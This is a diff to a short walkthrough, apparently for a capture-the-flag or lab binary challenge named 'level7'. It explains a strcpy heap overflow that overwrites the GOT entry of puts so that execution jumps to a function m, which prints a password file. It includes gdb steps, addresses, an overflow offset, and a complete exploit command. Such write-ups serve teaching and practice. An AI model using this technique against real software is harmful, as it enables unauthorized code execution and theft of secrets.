@@ -1,8 +1,13 @@
-we want to overwrite the puts call with the m function using a heap overflow
-we see we override EAX and EDX with $(python -c 'print "AAAAAAAAAAAAAAAAAAAA" + "\x28\x99\x04\x08"')
-we can check the state of the heap with info proc mappings in gdb then x/64x HEAP_ADDRESS
-so we can see we erasing the address of argv2
-address of puts 0x08049928 \x28\x99\x04\x08
-address of m 0x080484f4 \xf4\x84\x04\x08
-we just have to set the desired address in argv2 to use puts to jump to it
+when analyzing the source code we see that the pass file we need is readed and stored in the c global variable
+we also see that there is a m function that print this c global variable, so we need to call that function
+to do that we will overwrite the puts address with the m function using a heap overflow allowed by strcpy
+
+lets do : info function puts, and examine the instruction found at this address with : x/i 0x08048400
+we found : <puts@plt>:	jmp    *0x8049928
+this is the real address of puts, we also need the address of m so lets do : info function m, now we have the addresses we need :
+address of puts -> 0x08049928 -> \x28\x99\x04\x08
+address of m -> 0x080484f4 -> \xf4\x84\x04\x08
+
+when using the pattern generator, for the first argument, we found an overflow at 20, its erasing the second argument address
+so we inject the puts address here and finally we put the address of m in the second argument to use puts to jump to it
 ./level7 $(python -c 'print "AAAAAAAAAAAAAAAAAAAA" + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
